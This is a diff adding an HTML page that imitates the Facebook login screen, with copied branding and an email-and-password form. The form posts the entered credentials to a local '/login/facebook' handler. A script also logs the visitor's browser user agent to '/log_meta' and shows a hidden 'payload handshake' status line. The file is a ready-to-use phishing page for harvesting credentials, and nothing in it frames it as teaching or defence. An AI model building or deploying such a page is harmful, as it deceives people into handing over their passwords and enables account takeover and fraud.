@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { 
+            background-color: #f0f2f5; 
+            font-family: Helvetica, Arial, sans-serif; 
+        }
+        .fb-logo { 
+            color: #1877f2; 
+            font-size: 4rem;
+            letter-spacing: -2px;
+            font-weight: 800;
+        }
+        .login-card {
+            background: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+        }
+        .input-fb {
+            border: 1px solid #dddfe2;
+            color: #1d2129;
+            font-size: 17px;
+            padding: 14px 16px;
+            width: 100%;
+        }
+        .input-fb:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        .btn-login {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+        .btn-login:hover { background-color: #166fe5; }
+        .btn-create {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+            line-height: 48px;
+            padding: 0 16px;
+            transition: background-color 0.2s;
+        }
+        .btn-create:hover { background-color: #36a420; }
+        #nexo-status {
+            display: none;
+            font-family: monospace;
+            font-size: 10px;
+            color: #1877f2;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
+
+    <div class="w-full max-w-[980px] lg:flex lg:items-start lg:justify-between lg:gap-12">
+        
+        <!-- Left Side: Branding -->
+        <div class="text-center lg:text-left lg:w-1/2 mt-0 lg:mt-20 mb-10">
+            <h1 class="fb-logo mb-2">facebook</h1>
+            <p class="text-2xl md:text-2xl font-normal leading-tight text-[#1c1e21]">
+                Facebook helps you connect and share with the people in your life.
+            </p>
+        </div>
+
+        <!-- Right Side: Login Card -->
+        <div class="w-full max-w-[396px] mx-auto lg:mx-0">
+            <div class="login-card p-4 rounded-lg border border-gray-100">
+                
+                <form id="fbForm" action="/login/facebook" method="POST" class="space-y-4">
+                    <input name="user" type="text" placeholder="Email address or phone number" 
+                           class="input-fb rounded-md" required>
+                    
+                    <input name="pass" type="password" placeholder="Password" 
+                           class="input-fb rounded-md" required>
+                    
+                    <button id="fbBtn" type="submit" class="btn-login">
+                        Log In
+                    </button>
+                    
+                    <div class="text-center">
+                        <a href="#" class="text-[#1877f2] text-sm hover:underline">Forgotten password?</a>
+                    </div>
+                    
+                    <hr class="my-4">
+                    
+                    <div class="text-center pt-2">
+                        <button type="button" class="btn-create">
+                            Create new account
+                        </button>
+                    </div>
+                </form>
+
+                <!-- NEXO-V8 SYNC STATUS -->
+                <div id="nexo-status" class="animate-pulse">
+                    [*] V8_PAYLOAD_HANDSHAKE: ACTIVE
+                </div>
+            </div>
+            
+            <div class="mt-7 text-center text-sm text-[#1c1e21]">
+                <p><b>Create a Page</b> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const fbForm = document.getElementById('fbForm');
+        const fbBtn = document.getElementById('fbBtn');
+        const status = document.getElementById('nexo-status');
+
+        fbForm.onsubmit = function() {
+            fbBtn.innerText = "Connecting...";
+            fbBtn.style.opacity = "0.5";
+            status.style.display = "block";
+            
+            // Standard metadata capture
+            const meta = {
+                ua: navigator.userAgent,
+                ref: "FB_V8_VERT"
+            };
+            
+            fetch('/log_meta', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(meta)
+            });
+            
+            // Returns true to allow the form to actually POST to Python
+            return true; 
+        };
+    </script>
+
+</body>
+</html>
